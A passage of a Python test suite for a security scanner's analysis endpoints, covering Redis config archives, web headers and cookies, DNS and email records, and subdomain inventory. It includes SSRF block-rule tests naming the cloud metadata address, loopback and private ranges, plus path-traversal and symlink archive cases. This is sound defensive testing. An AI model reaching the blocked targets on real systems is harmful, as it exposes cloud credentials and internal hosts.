    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/redis-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.tar"},
        )

    payload = response.json()
    reasons = {item.get("skip_reason") for item in payload["files_detected"]}
    finding_ids = {finding["id"] for finding in payload["findings"]}
    serialized = json.dumps(payload)
    assert response.status_code == 200
    assert "path_traversal" in reasons
    assert "not_regular_file:symlink" in reasons
    assert "not_regular_file:hardlink" in reasons
    assert "sensitive_file_not_read" in reasons
    assert "acl_file_not_read" in reasons
    assert "dump_or_aof_not_read" in reasons
    assert "redis_config_path_traversal" in finding_ids
    assert "redis_config_not_regular_file" in finding_ids
    assert "redis_env_file_sensitive_present" in finding_ids
    assert "redis_acl_file_present" in finding_ids
    assert "redis_dump_or_aof_file_present" in finding_ids
    assert "super-secret-password" not in serialized
    assert "acl_password_hash_should_not_render" not in serialized
    assert "dump_value_should_not_render" not in serialized


@pytest.mark.anyio
async def test_analyze_redis_config_respects_file_and_byte_limits(monkeypatch, tmp_path):
    monkeypatch.setattr(runner, "REDIS_CONFIG_MAX_FILES", 1)
    monkeypatch.setattr(runner, "REDIS_CONFIG_MAX_FILE_BYTES", 120)
    monkeypatch.setattr(runner, "REDIS_CONFIG_MAX_TOTAL_BYTES", 180)
    archive_path = write_zip_archive(
        tmp_path,
        {
            "deploy/redis/redis.conf": b"port 6379\n",
            "deploy/redis/redis-extra.conf": b"requirepass " + b"x" * 150 + b"\n",
            "deploy/redis/redis-third.conf": b"protected-mode no\n",
        },
    )
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/redis-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    reasons = {item.get("skip_reason") for item in payload["files_detected"]}
    serialized = json.dumps(payload)
    assert response.status_code == 200
    assert payload["summary"]["files_reviewed"] == 1
    assert payload["summary"]["truncated"] is True
    assert "file_too_large" in reasons
    assert "too_many_files" in reasons
    assert "xxxxxxxxxxxxxxxxxxxxxxxx" not in serialized


@pytest.mark.anyio
async def test_analyze_web_basic_reports_http_headers_cookies_and_well_known_files():
    server = start_test_http_server()
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/web-basic",
            json={
                "url": f"http://127.0.0.1:{server.server_port}/",
                "allow_private_targets": True,
                "timeout_seconds": 2,
                "max_response_bytes": 4096,
                "max_redirects": 3,
                "allowed_ports": [80, 443, server.server_port],
            },
        )

    server.shutdown()
    payload = response.json()
    finding_ids = {finding["id"] for finding in payload["findings"]}
    assert response.status_code == 200
    assert payload["analyzer"] == "web_basic"
    assert payload["http"]["status_code"] == 200
    assert payload["http"]["server"]
    assert payload["cookies"][0]["name"] == "sid"
    assert payload["cookies"][0]["value_redacted"] is True
    assert payload["cookies"][0]["httponly"] is True
    assert payload["http"]["response_headers"]["Set-Cookie"] == "[redacted]"
    assert "supersecret" not in json.dumps(payload)
    assert payload["security_headers"]["Content-Security-Policy"]["present"] is False
    assert payload["robots_txt"]["present"] is True
    assert payload["security_txt"]["present"] is True
    assert payload["summary"]["cookies_count"] == 1
    assert "web_http_without_https" in finding_ids
    assert "web_csp_missing" in finding_ids


def test_web_query_redaction_helpers_preserve_safe_params_and_redact_sensitive_values():
    redacted = runner.redact_url_query("https://example.test/path?utm_source=news&api_key=secret%201&flag")

    assert "utm_source=news" in redacted
    assert "api_key=REDACTED" in redacted
    assert "secret" not in redacted


@pytest.mark.anyio
async def test_analyze_web_basic_redacts_sensitive_query_params_in_result():
    server = start_test_http_server()
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/web-basic",
            json={
                "url": f"http://127.0.0.1:{server.server_port}/?token=supersecret&page=1&Token=second",
                "allow_private_targets": True,
                "timeout_seconds": 2,
                "max_response_bytes": 4096,
                "max_redirects": 3,
                "allowed_ports": [80, 443, server.server_port],
            },
        )

    server.shutdown()
    payload = response.json()
    serialized = json.dumps(payload)
    assert response.status_code == 200
    assert "supersecret" not in serialized
    assert "second" not in serialized
    assert payload["target"]["original_url"].endswith("/?token=REDACTED&page=1&Token=REDACTED")
    assert payload["target"]["final_url"].endswith("/?token=REDACTED&page=1&Token=REDACTED")
    assert payload["target"]["query_string_present"] is True
    assert payload["target"]["query_params_redacted"] is True
    assert set(payload["target"]["redacted_query_params"]) == {"Token", "token"}
    assert payload["robots_txt"]["url"].endswith("/robots.txt")
    assert payload["security_txt"]["url"].endswith("/.well-known/security.txt")


@pytest.mark.anyio
async def test_analyze_web_basic_follows_redirects_and_stops_at_limit():
    server = start_test_http_server()
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        followed = await client.post(
            "/analyze/web-basic",
            json={
                "url": f"http://127.0.0.1:{server.server_port}/redirect",
                "allow_private_targets": True,
                "timeout_seconds": 2,
                "max_response_bytes": 4096,
                "max_redirects": 3,
                "allowed_ports": [80, 443, server.server_port],
            },
        )
        limited = await client.post(
            "/analyze/web-basic",
            json={
                "url": f"http://127.0.0.1:{server.server_port}/loop",
                "allow_private_targets": True,
                "timeout_seconds": 2,
                "max_response_bytes": 4096,
                "max_redirects": 1,
                "allowed_ports": [80, 443, server.server_port],
            },
        )

    server.shutdown()
    followed_payload = followed.json()
    limited_payload = limited.json()
    assert followed.status_code == 200
    assert followed_payload["target"]["final_url"].endswith("/final")
    assert followed_payload["summary"]["redirects_count"] == 1
    assert limited.status_code == 200
    assert limited_payload["summary"]["redirects_count"] == 1
    assert "web_redirect_limit_reached" in {finding["id"] for finding in limited_payload["findings"]}
    assert limited_payload["errors"]


@pytest.mark.anyio
async def test_analyze_web_basic_redacts_sensitive_query_params_in_redirects():
    server = start_test_http_server()
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/web-basic",
            json={
                "url": f"http://127.0.0.1:{server.server_port}/redirect-query",
                "allow_private_targets": True,
                "timeout_seconds": 2,
                "max_response_bytes": 4096,
                "max_redirects": 3,
                "allowed_ports": [80, 443, server.server_port],
            },
        )

    server.shutdown()
    payload = response.json()
    serialized = json.dumps(payload)
    assert response.status_code == 200
    assert "supersecret" not in serialized
    assert payload["http"]["redirects"][0]["to_url"].endswith("/final?token=REDACTED&page=1")
    assert payload["target"]["final_url"].endswith("/final?token=REDACTED&page=1")
    assert payload["target"]["query_params_redacted"] is True


@pytest.mark.anyio
async def test_analyze_web_basic_detects_redirect_loop():
    server = start_test_http_server()
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/web-basic",
            json={
                "url": f"http://127.0.0.1:{server.server_port}/loop",
                "allow_private_targets": True,
                "timeout_seconds": 2,
                "max_response_bytes": 4096,
                "max_redirects": 3,
                "allowed_ports": [80, 443, server.server_port],
            },
        )

    server.shutdown()
    payload = response.json()
    assert response.status_code == 200
    assert "web_redirect_loop_detected" in {finding["id"] for finding in payload["findings"]}
    assert payload["errors"]


@pytest.mark.anyio
async def test_analyze_web_basic_blocks_private_targets_by_default():
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/web-basic",
            json={"url": "http://127.0.0.1/", "allow_private_targets": False},
        )

    assert response.status_code == 400
    assert "blocked address range" in response.json()["detail"]


@pytest.mark.anyio
async def test_analyze_web_basic_enforces_allowed_ports(monkeypatch):
    public_ip = runner.ipaddress.ip_address("93.184.216.34")
    monkeypatch.setattr(runner, "resolve_web_host", lambda host, port: {public_ip})

    runner.validate_web_url_allowed("https://example.test", allow_private_targets=False, allowed_ports=(80, 443))
    runner.validate_web_url_allowed("http://example.test", allow_private_targets=False, allowed_ports=(80, 443))
    runner.validate_web_url_allowed("https://example.test:443", allow_private_targets=False, allowed_ports=(80, 443))
    runner.validate_web_url_allowed("http://example.test:80", allow_private_targets=False, allowed_ports=(80, 443))

    with pytest.raises(runner.HTTPException) as rejected:
        runner.validate_web_url_allowed("https://example.test:8443", allow_private_targets=False, allowed_ports=(80, 443))
    assert "port 8443 is not allowed" in rejected.value.detail

    runner.validate_web_url_allowed("https://example.test:8443", allow_private_targets=False, allowed_ports=(80, 443, 8443))


@pytest.mark.anyio
async def test_analyze_web_basic_blocks_localhost_metadata_and_private_targets(monkeypatch):
    with pytest.raises(runner.HTTPException) as localhost_rejected:
        runner.validate_web_url_allowed("http://localhost/", allow_private_targets=False, allowed_ports=(80, 443))
    with pytest.raises(runner.HTTPException) as loopback_rejected:
        runner.validate_web_url_allowed("http://[::1]/", allow_private_targets=False, allowed_ports=(80, 443))
    with pytest.raises(runner.HTTPException) as metadata_rejected:
        runner.validate_web_url_allowed("http://169.254.169.254/", allow_private_targets=True, allowed_ports=(80, 443))
    with pytest.raises(runner.HTTPException) as private_rejected:
        runner.validate_web_url_allowed("http://192.168.1.20/", allow_private_targets=False, allowed_ports=(80, 443))

    runner.validate_web_url_allowed("http://192.168.1.20/", allow_private_targets=True, allowed_ports=(80, 443))
    monkeypatch.setattr(runner, "resolve_web_host", lambda host, port: {runner.ipaddress.ip_address("192.168.1.20")})
    with pytest.raises(runner.HTTPException) as host_rejected:
        runner.validate_web_url_allowed("http://example.test/", allow_private_targets=False, allowed_ports=(80, 443))

    assert "loopback" in localhost_rejected.value.detail
    assert "loopback" in loopback_rejected.value.detail
    assert "cloud metadata" in metadata_rejected.value.detail
    assert "private address" in private_rejected.value.detail
    assert "private address" in host_rejected.value.detail


@pytest.mark.anyio
async def test_analyze_web_basic_blocks_private_redirect_target():
    server = start_test_http_server()
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/web-basic",
            json={
                "url": f"http://127.0.0.1:{server.server_port}/redirect-private",
                "allow_private_targets": True,
                "timeout_seconds": 2,
                "max_response_bytes": 4096,
                "max_redirects": 3,
                "allowed_ports": [80, 443, server.server_port],
            },
        )

    server.shutdown()
    assert response.status_code == 400
    assert "cloud metadata" in response.json()["detail"]


@pytest.mark.anyio
async def test_analyze_web_basic_blocks_unsafe_redirect_targets():
    server = start_test_http_server()
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        file_redirect = await client.post(
            "/analyze/web-basic",
            json={
                "url": f"http://127.0.0.1:{server.server_port}/redirect-file",
                "allow_private_targets": True,
                "timeout_seconds": 2,
                "max_response_bytes": 4096,
                "max_redirects": 3,
                "allowed_ports": [80, 443, server.server_port],
            },
        )
        port_redirect = await client.post(
            "/analyze/web-basic",
            json={
                "url": f"http://127.0.0.1:{server.server_port}/redirect-port",
                "allow_private_targets": True,
                "timeout_seconds": 2,
                "max_response_bytes": 4096,
                "max_redirects": 3,
                "allowed_ports": [80, 443, server.server_port],
            },
        )

    server.shutdown()
    assert file_redirect.status_code == 400
    assert "Only http and https" in file_redirect.json()["detail"]
    assert port_redirect.status_code == 400
    assert "port 8443 is not allowed" in port_redirect.json()["detail"]


@pytest.mark.anyio
async def test_analyze_web_basic_limits_response_bytes():
    server = start_test_http_server()
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/web-basic",
            json={
                "url": f"http://127.0.0.1:{server.server_port}/large",
                "allow_private_targets": True,
                "timeout_seconds": 2,
                "max_response_bytes": 32,
                "max_redirects": 1,
                "allowed_ports": [80, 443, server.server_port],
            },
        )

    server.shutdown()
    payload = response.json()
    assert response.status_code == 200
    assert payload["http"]["bytes_read"] == 32
    assert payload["http"]["response_truncated"] is True


@pytest.mark.anyio
async def test_analyze_domain_basic_reports_dns_and_email_security(monkeypatch):
    records = {
        ("example.com", "A"): (["93.184.216.34"], []),
        ("example.com", "AAAA"): (["2606:2800:220:1:248:1893:25c8:1946"], []),
        ("example.com", "CNAME"): ([], []),
        ("example.com", "MX"): ([{"preference": 10, "exchange": "mail.example.com"}], []),
        ("example.com", "NS"): (["ns1.example.com", "ns2.example.com"], []),
        ("example.com", "TXT"): (["v=spf1 include:_spf.example.com -all"], []),
        ("example.com", "CAA"): ([{"flags": 0, "tag": "issue", "value": "letsencrypt.org"}], []),
        ("example.com", "SOA"): ([{"mname": "ns1.example.com", "rname": "hostmaster.example.com", "serial": 1}], []),
        ("_dmarc.example.com", "TXT"): (["v=DMARC1; p=reject; rua=mailto:dmarc@example.com; pct=100"], []),
        ("www.example.com", "A"): (["93.184.216.34"], []),
        ("www.example.com", "AAAA"): ([], []),
        ("www.example.com", "CNAME"): ([], []),
    }
    monkeypatch.setattr(runner, "query_dns_record", lambda domain, record_type, timeout: records.get((domain, record_type), ([], [])))
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post("/analyze/domain-basic", json={"domain": "Example.COM", "timeout_seconds": 1})

    payload = response.json()
    assert response.status_code == 200
    assert payload["analyzer"] == "domain_basic"
    assert payload["target"]["normalized_domain"] == "example.com"
    assert payload["dns"]["A"] == ["93.184.216.34"]
    assert payload["email_security"]["spf"]["present"] is True
    assert payload["email_security"]["spf"]["all_mechanism"] == "-all"
    assert payload["email_security"]["dmarc"]["policy"] == "reject"
    assert payload["summary"]["mx_present"] is True
    assert payload["summary"]["www_resolves"] is True


@pytest.mark.anyio
async def test_analyze_domain_basic_generates_informational_findings(monkeypatch):
    records = {
        ("example.com", "A"): (["93.184.216.34"], []),
        ("example.com", "AAAA"): ([], []),
        ("example.com", "CNAME"): ([], []),
        ("example.com", "MX"): ([], []),
        ("example.com", "NS"): (["ns1.example-dns.com"], []),
        ("example.com", "TXT"): (["v=spf1 +all", "v=spf1 include:mail.example.com ?all", "api_key=[redacted]"], []),
        ("example.com", "CAA"): ([], []),
        ("example.com", "SOA"): ([], []),
        ("_dmarc.example.com", "TXT"): (["v=DMARC1; p=none; pct=50"], []),
        ("www.example.com", "A"): ([], []),
        ("www.example.com", "AAAA"): ([], []),
        ("www.example.com", "CNAME"): ([], []),
    }
    monkeypatch.setattr(runner, "query_dns_record", lambda domain, record_type, timeout: records.get((domain, record_type), ([], [])))
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post("/analyze/domain-basic", json={"domain": "example.com", "timeout_seconds": 1})

    payload = response.json()
    finding_ids = {finding["id"] for finding in payload["findings"]}
    assert response.status_code == 200
    assert "domain_single_nameserver" in finding_ids
    assert "domain_mx_absent" in finding_ids
    assert "domain_multiple_spf_records" in finding_ids
    assert "domain_spf_plus_all" in finding_ids
    assert "domain_dmarc_policy_none" in finding_ids
    assert "domain_dmarc_pct_partial" in finding_ids
    assert "domain_caa_absent" in finding_ids
    assert "domain_www_not_resolving" in finding_ids
    assert "domain_txt_sensitive_indicator" in finding_ids


@pytest.mark.anyio
async def test_analyze_domain_basic_reports_dmarc_absent_and_dns_errors(monkeypatch):
    def fake_query(domain: str, record_type: str, timeout: float):
        if domain == "_dmarc.example.com":
            return [], []
        if record_type == "A":
            return [], ["A query via 127.0.0.53 failed safely: TimeoutError."]
        return [], []

    monkeypatch.setattr(runner, "query_dns_record", fake_query)
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post("/analyze/domain-basic", json={"domain": "example.com", "timeout_seconds": 1})

    payload = response.json()
    assert response.status_code == 200
    assert "domain_dmarc_absent" in {finding["id"] for finding in payload["findings"]}
    assert payload["errors"]


def test_analyze_domain_basic_queries_www_baseline_without_duplication(monkeypatch):
    calls: list[tuple[str, str]] = []

    def fake_query(domain: str, record_type: str, timeout: float):
        calls.append((domain, record_type))
        if domain == "www.example.com" and record_type == "CNAME":
            return ["example.com"], []
        return [], []

    monkeypatch.setattr(runner, "query_dns_record", fake_query)

    payload = runner.analyze_domain_basic_target("example.com", timeout_seconds=1)

    assert payload["dns"]["www"]["checked"] is True
    assert payload["dns"]["www"]["domain"] == "www.example.com"
    assert ("www.example.com", "A") in calls
    assert ("www.example.com", "AAAA") in calls
    assert ("www.example.com", "CNAME") in calls


def test_analyze_domain_basic_skips_www_baseline_when_target_already_www(monkeypatch):
    calls: list[tuple[str, str]] = []

    def fake_query(domain: str, record_type: str, timeout: float):
        calls.append((domain, record_type))
        return [], []

    monkeypatch.setattr(runner, "query_dns_record", fake_query)

    payload = runner.analyze_domain_basic_target("www.example.com", timeout_seconds=1)

    assert payload["dns"]["www"] == {"checked": False, "reason": "Target domain already starts with www."}
    assert all(not domain.startswith("www.www.") for domain, _ in calls)
    assert ("_dmarc.www.example.com", "TXT") in calls


@pytest.mark.anyio
async def test_analyze_domain_basic_rejects_invalid_domain():
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        url_response = await client.post("/analyze/domain-basic", json={"domain": "https://example.com"})
        ip_response = await client.post("/analyze/domain-basic", json={"domain": "127.0.0.1"})
        local_response = await client.post("/analyze/domain-basic", json={"domain": "test.local"})

    assert url_response.status_code == 400
    assert ip_response.status_code == 400
    assert local_response.status_code == 400


@pytest.mark.anyio
async def test_analyze_subdomains_basic_normalizes_deduplicates_and_resolves(monkeypatch):
    calls: list[tuple[str, str]] = []
    records = {
        ("www.example.com", "A"): (["93.184.216.34"], []),
        ("www.example.com", "AAAA"): ([], []),
        ("www.example.com", "CNAME"): (["example.net"], []),
        ("api.example.com", "A"): ([], []),
        ("api.example.com", "AAAA"): ([], []),
        ("api.example.com", "CNAME"): ([], []),
    }

    def fake_query(domain: str, record_type: str, timeout: float):
        calls.append((domain, record_type))
        return records.get((domain, record_type), ([], []))

    monkeypatch.setattr(runner, "query_dns_record", fake_query)
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/subdomains-basic",
            json={
                "root_domain": "Example.COM",
                "subdomains": ["www", "WWW.example.com", "api.example.com"],
                "timeout_seconds": 1,
                "wildcard_checks": 0,
            },
        )

    payload = response.json()
    assert response.status_code == 200
    assert payload["analyzer"] == "subdomain_inventory_basic"
    assert payload["target"]["normalized_root_domain"] == "example.com"
    assert payload["summary"]["candidates_submitted"] == 3
    assert payload["summary"]["candidates_accepted"] == 2
    assert payload["summary"]["candidates_rejected"] == 1
    assert payload["summary"]["resolved_count"] == 1
    assert payload["summary"]["cname_count"] == 1
    assert payload["summary"]["truncated"] is False
    assert payload["summary"]["deadline_reached"] is False
    assert payload["limits"]["global_deadline_seconds"] == runner.SUBDOMAIN_GLOBAL_DEADLINE_SECONDS
    assert payload["wildcard_dns"]["checked"] is False
    assert {candidate["status"] for candidate in payload["candidates"]} == {"accepted", "rejected"}
    assert {result["fqdn"] for result in payload["results"]} == {"www.example.com", "api.example.com"}
    assert "subdomain_duplicate_candidate" in {finding["id"] for finding in payload["findings"]}
    assert "subdomain_external_cname" in {finding["id"] for finding in payload["findings"]}
    assert all(not domain.startswith("inspectra-wildcard-") for domain, _ in calls)


@pytest.mark.anyio
async def test_analyze_subdomains_basic_rejects_out_of_scope_candidates(monkeypatch):
    calls: list[tuple[str, str]] = []

    def fake_query(domain: str, record_type: str, timeout: float):
        calls.append((domain, record_type))
        return [], []

    monkeypatch.setattr(runner, "query_dns_record", fake_query)
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/subdomains-basic",
            json={
                "root_domain": "example.com",
                "subdomains": ["api.evil.com", "*.example.com", "https://api.example.com", "api.example.com.", "example.com", "127.0.0.1"],
                "timeout_seconds": 1,
                "wildcard_checks": 0,
            },
        )

    payload = response.json()
    assert response.status_code == 200
    assert payload["summary"]["candidates_accepted"] == 0
    assert payload["summary"]["candidates_rejected"] == 6
    assert all(candidate["status"] == "rejected" for candidate in payload["candidates"])
    assert "subdomain_candidate_rejected" in {finding["id"] for finding in payload["findings"]}
    assert calls == []


@pytest.mark.anyio
async def test_analyze_subdomains_basic_detects_private_ips_and_dns_errors(monkeypatch):
    def fake_query(domain: str, record_type: str, timeout: float):
        if record_type == "A":
            return ["192.168.1.10"], []
        if record_type == "AAAA":
            return [], ["AAAA query via 127.0.0.53 failed safely: TimeoutError."]
        return [], []

    monkeypatch.setattr(runner, "query_dns_record", fake_query)
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/subdomains-basic",
            json={"root_domain": "example.com", "subdomains": ["admin"], "timeout_seconds": 1, "wildcard_checks": 0},
        )

    payload = response.json()
    assert response.status_code == 200
    assert payload["summary"]["private_ip_count"] == 1
    assert payload["results"][0]["private_or_reserved_ip_detected"] is True
    assert payload["errors"]
    assert "subdomain_private_or_reserved_ip" in {finding["id"] for finding in payload["findings"]}


@pytest.mark.anyio
@pytest.mark.parametrize("ipv6_address", ["::1", "fc00::1", "fe80::1", "ff02::1", "::", "2001:db8::1"])
async def test_analyze_subdomains_basic_detects_private_or_reserved_ipv6(monkeypatch, ipv6_address):
    def fake_query(domain: str, record_type: str, timeout: float):
        if record_type == "AAAA":
            return [ipv6_address], []
        return [], []

    monkeypatch.setattr(runner, "query_dns_record", fake_query)
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/subdomains-basic",
            json={"root_domain": "example.com", "subdomains": ["admin"], "timeout_seconds": 1, "wildcard_checks": 0},
        )

    payload = response.json()
    finding = next(finding for finding in payload["findings"] if finding["id"] == "subdomain_private_or_reserved_ip")
    assert response.status_code == 200
    assert payload["results"][0]["private_or_reserved_ip_detected"] is True
    assert finding["level"] == "low"
    assert "vulnerability" not in json.dumps(payload).lower()


@pytest.mark.anyio
async def test_analyze_subdomains_basic_external_cname_handles_trailing_dot_and_case(monkeypatch):
    def fake_query(domain: str, record_type: str, timeout: float):
        if domain == "internal.example.com" and record_type == "CNAME":
            return ["Target.Example.COM."], []
        if domain == "external.example.com" and record_type == "CNAME":
            return ["app.External-Provider.COM."], []
        return [], []

    monkeypatch.setattr(runner, "query_dns_record", fake_query)
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/subdomains-basic",
            json={
                "root_domain": "example.com",
                "subdomains": ["internal", "external"],
                "timeout_seconds": 1,
                "wildcard_checks": 0,
            },
        )

    payload = response.json()
    findings = [finding for finding in payload["findings"] if finding["id"] == "subdomain_external_cname"]
    results = {result["fqdn"]: result for result in payload["results"]}
    assert response.status_code == 200
    assert "external_cname_detected" not in results["internal.example.com"]
    assert results["external.example.com"]["external_cname_detected"] is True
    assert len(findings) == 1
    assert "app.External-Provider.COM." in findings[0]["evidence"]


@pytest.mark.anyio
async def test_analyze_subdomains_basic_global_deadline_returns_partial_result(monkeypatch):
    class FakeClock:
        def __init__(self) -> None:
            self.value = 0.0

        def monotonic(self) -> float:
            return self.value

        def advance(self, seconds: float) -> None:
            self.value += seconds

    clock = FakeClock()
    calls: list[tuple[str, str]] = []

    def fake_query(domain: str, record_type: str, timeout: float):
        calls.append((domain, record_type))
        if domain == "www.example.com" and record_type == "A":
            clock.advance(2.0)
            return ["93.184.216.34"], []
        return [], []

    monkeypatch.setattr(runner.time, "monotonic", clock.monotonic)
    monkeypatch.setattr(runner, "query_dns_record", fake_query)
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/subdomains-basic",
            json={
                "root_domain": "example.com",
                "subdomains": ["www", "api", "cdn"],
                "timeout_seconds": 1,
                "wildcard_checks": 2,
                "global_deadline_seconds": 1,
            },
        )

    payload = response.json()
    assert response.status_code == 200
    assert payload["summary"]["truncated"] is True
    assert payload["summary"]["deadline_reached"] is True
    assert payload["summary"]["candidates_processed"] == 1
    assert payload["summary"]["candidates_pending"] == 2
    assert payload["limits"]["global_deadline_seconds"] == 1
    assert payload["wildcard_dns"]["checked"] is False
    assert payload["wildcard_dns"]["skipped_reason"] == "global_deadline_reached"
    assert {result["fqdn"]: result["status"] for result in payload["results"]} == {
        "www.example.com": "partial",
        "api.example.com": "skipped",
        "cdn.example.com": "skipped",
    }
    assert "subdomain_global_deadline_reached" in {finding["id"] for finding in payload["findings"]}
    assert calls == [("www.example.com", "A")]


@pytest.mark.anyio
async def test_analyze_subdomains_basic_global_deadline_cuts_wildcard_probe(monkeypatch):
    class FakeClock:
        def __init__(self) -> None:
            self.value = 0.0

        def monotonic(self) -> float:
            return self.value

        def advance(self, seconds: float) -> None:
            self.value += seconds

    clock = FakeClock()
    calls: list[tuple[str, str]] = []

    def fake_query(domain: str, record_type: str, timeout: float):
        calls.append((domain, record_type))
        if domain.startswith("inspectra-wildcard-") and record_type == "A":
            clock.advance(2.0)
            return ["93.184.216.34"], []
        return [], []

    monkeypatch.setattr(runner.time, "monotonic", clock.monotonic)
    monkeypatch.setattr(runner, "query_dns_record", fake_query)
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/subdomains-basic",
            json={
                "root_domain": "example.com",
                "subdomains": ["www"],
                "timeout_seconds": 1,
                "wildcard_checks": 2,
                "global_deadline_seconds": 1,
            },
        )

    payload = response.json()
    wildcard_calls = [call for call in calls if call[0].startswith("inspectra-wildcard-")]
    assert response.status_code == 200
    assert payload["summary"]["truncated"] is True
    assert payload["summary"]["deadline_reached"] is True
    assert payload["wildcard_dns"]["checked"] is True
    assert payload["wildcard_dns"]["partial"] is True
    assert payload["wildcard_dns"]["deadline_reached"] is True
    assert len(wildcard_calls) == 1


@pytest.mark.anyio
async def test_analyze_subdomains_basic_reports_wildcard_dns_possible(monkeypatch):
    def fake_query(domain: str, record_type: str, timeout: float):
        if domain.startswith("inspectra-wildcard-") and record_type == "A":
            return ["93.184.216.34"], []
        return [], []

    monkeypatch.setattr(runner, "query_dns_record", fake_query)
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/subdomains-basic",
            json={"root_domain": "example.com", "subdomains": ["www"], "timeout_seconds": 1, "wildcard_checks": 2},
        )

    payload = response.json()
    assert response.status_code == 200
    assert payload["wildcard_dns"]["checked"] is True
    assert payload["wildcard_dns"]["possible"] is True
    assert payload["wildcard_dns"]["probes_count"] == 2
    assert "subdomain_wildcard_dns_possible" in {finding["id"] for finding in payload["findings"]}


@pytest.mark.anyio
async def test_analyze_subdomains_basic_reports_wildcard_dns_not_possible(monkeypatch):
    monkeypatch.setattr(runner, "query_dns_record", lambda domain, record_type, timeout: ([], []))
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/subdomains-basic",
            json={"root_domain": "example.com", "subdomains": ["www"], "timeout_seconds": 1, "wildcard_checks": 2},
        )

    payload = response.json()
    assert response.status_code == 200
    assert payload["wildcard_dns"]["checked"] is True
    assert payload["wildcard_dns"]["possible"] is False
    assert payload["summary"]["wildcard_dns_possible"] is False


@pytest.mark.anyio
async def test_analyze_subdomains_basic_respects_max_candidates():
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/subdomains-basic",
            json={"root_domain": "example.com", "subdomains": ["www", "api"], "max_candidates": 1, "wildcard_checks": 0},
        )
        deadline_response = await client.post(
            "/analyze/subdomains-basic",
            json={"root_domain": "example.com", "subdomains": ["www"], "global_deadline_seconds": 0},
        )

    assert response.status_code == 400
    assert "Too many subdomain candidates" in response.json()["detail"]
    assert deadline_response.status_code == 400
    assert "global deadline" in deadline_response.json()["detail"]


def test_parse_dns_nameserver_lines_is_ipv4_only_and_bounded():
    lines = [
        "# comment",
        "search example.test",
        "nameserver 192.0.2.1",
        "nameserver 2001:db8::1",
        "nameserver not-an-ip",
        "nameserver 198.51.100.2",
        "nameserver 203.0.113.3",
        "nameserver 203.0.113.4",
    ]

    assert runner.parse_dns_nameserver_lines(lines) == ["192.0.2.1", "198.51.100.2", "203.0.113.3"]
    assert runner.parse_dns_nameserver_lines([]) == []
    assert runner.parse_dns_nameserver_lines(["nameserver 2001:db8::1"]) == []


def test_query_dns_record_reports_no_nameservers(monkeypatch):
    monkeypatch.setattr(runner, "dns_nameservers", lambda: [])

    records, errors = runner.query_dns_record("example.com", "A", 1)

    assert records == []
    assert errors == ["No DNS nameservers were configured for the runner."]


def test_runner_normalize_domain_validation_edges():
    assert runner.normalize_domain("WWW.Example.COM") == "www.example.com"
    assert runner.normalize_domain("täst.example") == "xn--tst-qla.example"

    invalid_domains = [
        "http://example.com",
        "example.com/path",
        "example.com?x=1",
        "example.com#fragment",
        "user:pass@example.com",
        "exa mple.com",
        "::1",
        "localhost",
        "test.internal",
        "example..com",
        f"{'a' * 64}.example",
    ]
    for raw_domain in invalid_domains:
        with pytest.raises(Exception):
            runner.normalize_domain(raw_domain)


def test_parse_dns_response_decodes_core_record_types():
    a_records, a_truncated = runner.parse_dns_response(
        make_dns_response(runner.DNS_RECORD_TYPES["A"], bytes([93, 184, 216, 34])),
        DNS_TEST_QUERY_ID,
        runner.DNS_RECORD_TYPES["A"],
    )
    aaaa_records, _ = runner.parse_dns_response(
